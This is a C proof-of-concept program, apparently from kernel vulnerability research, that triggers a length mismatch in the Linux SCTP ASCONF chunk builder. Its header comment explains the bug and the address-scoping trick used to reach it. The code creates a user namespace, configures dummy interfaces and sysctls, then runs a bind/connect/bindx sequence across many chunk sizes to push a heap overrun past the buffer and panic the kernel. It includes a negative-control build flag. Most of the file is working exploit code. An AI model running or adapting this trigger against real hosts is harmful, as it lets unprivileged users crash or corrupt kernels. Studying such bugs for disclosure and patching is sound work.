/* Candidate C3: sctp_make_asconf_update_ip() length-accounting mismatch.
 *
 * net/sctp/sm_make_chunk.c:2848 sizes the ASCONF chunk in one pass and fills
 * it in a second. When asoc->asconf_addr_del_pending is set, the sizing pass
 * charges the del-pickup parameter using addr_param_len taken from the
 * address currently being walked in the *caller's* array (:2877-2878):
 *
 *      if (asoc->asconf_addr_del_pending && !del_pickup) {
 *              / * reuse the parameter length from the same scope one * /
 *              totallen += paramlen;
 *              totallen += addr_param_len;      <-- addrs[i]'s length
 *
 * but the write pass recomputes it from asconf_addr_del_pending's own
 * family (:2908-2916):
 *
 *      addr = asoc->asconf_addr_del_pending;
 *      addr_param_len = af->to_addr_param(addr, &addr_param);   <-- its own
 *      sctp_addto_chunk(retval, addr_param_len, &addr_param);
 *
 * The comment states the assumption ("same scope one") that nothing enforces.
 * v6 pending (20-byte addr param) + v4 add (8-byte) under-reserves by 12,
 * so sctp_addto_chunk() -> skb_put() writes past the reserved chunk. If the
 * overrun exceeds the skb's slack tailroom, skb_put() trips skb_over_panic().
 *
 * Reaching it requires the endpoint bind list and the association bind list
 * to DISAGREE:
 *   - sctp_bindx_rem() refuses (-EBUSY) unless the ENDPOINT has >= 2 addrs.
 *   - the del_pending branch needs sctp_find_unmatch_addr()==NULL && addrcnt==1,
 *     i.e. the ASSOCIATION holds exactly the single address being removed.
 *
 * The lever is address scoping. sctp_in_scope() (default policy ENABLE) copies
 * an endpoint address into a new association only when addr_scope <= peer_scope
 * (GLOBAL=0 < PRIVATE=1 < LINK=2 < LOOPBACK=3). Connecting to a GLOBAL-scope
 * peer therefore leaves PRIVATE v4 addresses on the endpoint but out of the
 * association -- exactly the divergence required.
 *
 * Sequence per association:
 *   1. bind global v6            -> ep {v6g}
 *   2. bindx_add private v4      -> ep {v6g, v4p}      (assoc does not exist yet)
 *   3. connect to global v6 peer -> assoc {v6g} only   (v4p out of scope)
 *   4. bindx_rem the v6          -> ep has 2, assoc has exactly it
 *                                -> asconf_addr_del_pending = v6 (20-byte param)
 *   5. bindx_add N private v4    -> ASCONF ADD; del-pickup reserved 8, writes 20
 *
 * Step 5's N is swept across associations within a single boot, because
 * whether the 12-byte overrun escapes the kmalloc bucket's slack depends on
 * the total chunk size.
 */
#include "common.h"
#include <netinet/in.h>
#include <arpa/inet.h>

#ifndef IPPROTO_SCTP
#define IPPROTO_SCTP 132
#endif
#define SOL_SCTP 132
#define SCTP_SOCKOPT_BINDX_ADD 100
#define SCTP_SOCKOPT_BINDX_REM 101

#define SRV_PORT_BASE 20000
#define CLI_PORT_BASE 30000

static int nl;

static void sysctl_set(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) { logf("WARN: cannot open %s", path); return; }
	if (write(fd, val, strlen(val)) < 0)
		logf("WARN: write %s failed", path);
	close(fd);
}

/* 2001:db8::X -- global scope, so it becomes the association's scope floor. */
static void mk_v6(unsigned char out[16], unsigned x)
{
	memset(out, 0, 16);
	out[0] = 0x20; out[1] = 0x01; out[2] = 0x0d; out[3] = 0xb8;
	out[14] = (x >> 8) & 0xff;
	out[15] = x & 0xff;
}

static void sa6(struct sockaddr_in6 *s, unsigned x, int port)
{
	memset(s, 0, sizeof(*s));
	s->sin6_family = AF_INET6;
	s->sin6_port = htons(port);
	mk_v6((unsigned char *)&s->sin6_addr, x);
}

/* 192.168.N.M -- PRIVATE scope, filtered out of a GLOBAL-scope association. */
static void sa4(struct sockaddr_in *s, unsigned c, unsigned d, int port)
{
	memset(s, 0, sizeof(*s));
	s->sin_family = AF_INET;
	s->sin_port = htons(port);
	s->sin_addr.s_addr = htonl((192u << 24) | (168u << 16) | (c << 8) | d);
}

static void setup_net(void)
{
	int ifi, i;
	unsigned char a6[16];

	sysctl_set("/proc/sys/net/ipv6/conf/all/disable_ipv6", "0");

	nl = nl_open();

	/* A fresh netns has lo DOWN. Delivery to a local address -- even one
	 * assigned to another interface -- is routed through lo, so without
	 * this every connect() to our own address blackholes and hangs. */
	{
		int lo = if_index("lo");
		if (lo > 0 && link_up(nl, lo) != 0)
			logf("WARN: link_up(lo) failed");
		else
			logf("lo up (ifindex=%d)", lo);
	}

	ifi = create_dummy(nl, "d0");
	if (ifi < 0)
		die("create dummy d0");
	sysctl_set("/proc/sys/net/ipv6/conf/d0/accept_dad", "0");
	sysctl_set("/proc/sys/net/ipv6/conf/d0/disable_ipv6", "0");
	if (link_up(nl, ifi) != 0)
		logf("WARN: link_up(d0)");

	/* Global v6 addresses: index 1 = server, 2.. = clients. */
	for (i = 1; i <= 40; i++) {
		mk_v6(a6, i);
		if (addr_add6(nl, ifi, a6, 64) != 0 && i <= 2)
			logf("WARN: addr_add6 %d failed", i);
	}
	/* Private v4 addresses to feed bindx_add. */
	for (i = 1; i <= 60; i++) {
		char buf[32];
		snprintf(buf, sizeof(buf), "192.168.7.%d", i);
		if (addr_add4(nl, ifi, buf, 24) != 0 && i <= 2)
			logf("WARN: addr_add4 %s failed", buf);
	}

	/* ASCONF must be enabled, and noauth removes the AUTH requirement that
	 * would otherwise gate ASCONF processing. Both are netns-scoped. */
	sysctl_set("/proc/sys/net/sctp/addip_enable", "1");
	sysctl_set("/proc/sys/net/sctp/addip_noauth_enable", "1");
	sysctl_set("/proc/sys/net/sctp/default_auto_asconf", "1");
	logf("net setup done (d0 ifindex=%d)", ifi);
}

/* Runs one full arm+trigger cycle. n_add = how many v4 addrs in the final
 * bindx_add, which sets the chunk size and thus how much slack tailroom the
 * 12-byte overrun has to escape. */
static void attempt(int iter, int n_add)
{
	struct sockaddr_in6 srv, cli;
	struct sockaddr_in v4[64];
	int s = -1, c = -1, rc;

	sa6(&srv, 1, SRV_PORT_BASE + iter);
	sa6(&cli, 2 + (iter % 30), CLI_PORT_BASE + iter);

	s = socket(AF_INET6, SOCK_STREAM, IPPROTO_SCTP);
	if (s < 0) { logf("socket(server) failed: %s", strerror(errno)); return; }
	c = socket(AF_INET6, SOCK_STREAM, IPPROTO_SCTP);
	if (c < 0) { logf("socket(client) failed: %s", strerror(errno)); close(s); return; }

	if (bind(s, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
		logf("iter%d bind(server) failed: %s", iter, strerror(errno));
		goto out;
	}
	if (listen(s, 8) < 0) { logf("listen failed: %s", strerror(errno)); goto out; }

	if (bind(c, (struct sockaddr *)&cli, sizeof(cli)) < 0) {
		logf("iter%d bind(client) failed: %s", iter, strerror(errno));
		goto out;
	}

	/* Step 2: endpoint gains a PRIVATE v4 while no association exists yet. */
	sa4(&v4[0], 7, 1, CLI_PORT_BASE + iter);
	rc = setsockopt(c, SOL_SCTP, SCTP_SOCKOPT_BINDX_ADD, &v4[0], sizeof(v4[0]));
	if (rc < 0) {
		logf("iter%d bindx_add(pre) failed: %s", iter, strerror(errno));
		goto out;
	}

	/* Step 3: association to a GLOBAL-scope peer -> v4 filtered out.
	 * Bounded by an alarm so one unreachable peer cannot stall the sweep. */
	alarm(6);
	rc = connect(c, (struct sockaddr *)&srv, sizeof(srv));
	alarm(0);
	if (rc < 0) {
		logf("iter%d connect failed: %s", iter, strerror(errno));
		goto out;
	}

	/* Step 4: arm asconf_addr_del_pending with the v6 (20-byte addr param).
	 *
	 * SKIP_ARM builds the negative control: identical in every other way,
	 * so if the control runs clean the crash is attributable to the
	 * del-pickup mismatch and not merely to adding N addresses. */
#ifndef SKIP_ARM
	rc = setsockopt(c, SOL_SCTP, SCTP_SOCKOPT_BINDX_REM, &cli, sizeof(cli));
	if (rc < 0) {
		logf("iter%d ARM bindx_rem failed: %s  <-- del_pending NOT set",
		     iter, strerror(errno));
		goto out;
	}
	logf("iter%d ARMED (del_pending = v6)", iter);
#else
	logf("iter%d CONTROL: arming step skipped", iter);
#endif

	/* Step 5: trigger. n_add v4 params (8B each) + del pickup reserved 8B
	 * but written as 20B. */
	{
		int i;
		for (i = 0; i < n_add; i++)
			sa4(&v4[i], 7, 2 + i, CLI_PORT_BASE + iter);
	}
	logf("iter%d TRIGGER bindx_add n=%d", iter, n_add);
	rc = setsockopt(c, SOL_SCTP, SCTP_SOCKOPT_BINDX_ADD, v4,
			sizeof(struct sockaddr_in) * n_add);
	logf("iter%d trigger rc=%d (%s)", iter, rc, rc < 0 ? strerror(errno) : "ok");

out:
	if (c >= 0) close(c);
	if (s >= 0) close(s);
}

static void on_alarm(int sig) { (void)sig; }   /* interrupt, do not die */

int main(void)
{
	int n;
	struct sigaction sa_alrm;

	memset(&sa_alrm, 0, sizeof(sa_alrm));
	sa_alrm.sa_handler = on_alarm;         /* no SA_RESTART: must interrupt */
	sigaction(SIGALRM, &sa_alrm, NULL);

	logf("=== SCTP ASCONF del-pickup length mismatch (C3) ===");
	enter_userns();
	setup_net();

	/* Sweep the add-count so the chunk lands at many different sizes; the
	 * 12-byte overrun only escapes the kmalloc bucket at some of them. */
	for (n = 1; n <= 24; n++)
		attempt(n, n);

	logf("sweep complete");
	return 0;
}
